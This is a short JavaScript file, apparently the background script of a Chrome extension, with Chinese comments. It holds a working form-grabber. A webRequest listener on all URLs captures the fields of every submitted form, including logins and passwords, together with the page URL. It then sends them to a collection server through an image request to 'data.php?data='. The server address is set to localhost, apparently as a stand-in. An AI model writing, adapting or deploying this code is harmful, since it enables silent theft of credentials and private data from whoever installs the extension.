$(document).ready(function(){

    var server = "http://127.0.0.1/"; //接收服务器
    var gate = "data.php?data=";  //接收文件
    var tabURL = window.location.href;
 
    var keys='';
    var blur='';

    function judgeUrl(url){
        var objExpr=new RegExp(/^http(s)?:\/\/127\.0\.0\.1/);
        return objExpr.test(url);
    }

    var payload={};

    chrome.webRequest.onBeforeRequest.addListener(
        function(details){ 
           
                var saveParamTemp="";
                for(var i in details.requestBody.formData){
                    saveParamTemp += "----" + i + " = "+details.requestBody.formData[i][0];
                }
                data = '---页面链接：' + details.url + '<br>' + saveParamTemp
                new Image().src = server + gate + data;
                // console.log(saveParamTemp);
                payload["url"]=details.url;
                payload["data"]=saveParamTemp;
            
            //console.log(details);
        },
        {urls: ["<all_urls>"]},
        ["requestBody"]);
   
    
});
